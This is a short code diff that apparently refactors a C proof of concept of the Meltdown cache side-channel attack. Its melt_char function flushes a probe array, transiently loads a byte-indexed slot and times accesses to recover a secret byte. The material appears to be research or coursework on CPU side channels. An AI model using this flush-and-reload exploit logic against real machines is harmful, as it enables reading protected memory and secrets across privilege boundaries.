@@ -5,7 +5,6 @@
 #include <time.h>
 
 #define REPS_THRES 1000000 // repetitions for the threshold
-#define REPS_MELT 1 // repetitions for mitigating noise in meltdown
 #define BYTE 256
 #define OFFSET 4096 // should theoretically work with 64, too 
 #define SECRET 20
@@ -74,19 +73,18 @@ static  __attribute__((optimize("-O0"))) char melt_char(char *p, char* probe, in
     }
 
 
-    for(int i = 0; i < REPS_MELT; i++) {
-        for (int j = 0; j < BYTE*OFFSET; j++)
-        {
-            flush(&probe[j]);
+    for (int j = 0; j < BYTE*OFFSET; j++)
+    {
+        flush(&probe[j]);
+    }
+    load(&probe[*p * OFFSET]);
+    for (int j = 0; j < BYTE; j++) { 
+        int64_t tmp = timed_access(&probe[j*OFFSET], 0, 0);
+        if (tmp < thres && tmp != 0 && tmp < access_times[j]) {
+            access_times[j] = tmp;
         }
-        for (int j = 0; j < BYTE; j++) { 
-            load(&probe[*p * OFFSET]);
-            int64_t tmp = timed_access(&probe[j*OFFSET], 0, 0);
-            if (tmp < thres && tmp != 0 && tmp < access_times[j]) {
-                access_times[j] = tmp;
-            }
-        }
-    } 
+    }
+    
     
     int64_t min_time = INT64_MAX;
     char min_ix;
@@ -97,7 +95,7 @@ static  __attribute__((optimize("-O0"))) char melt_char(char *p, char* probe, in
             min_time = access_times[i];
         }
     }
-    
+
     return min_ix;
 }
 
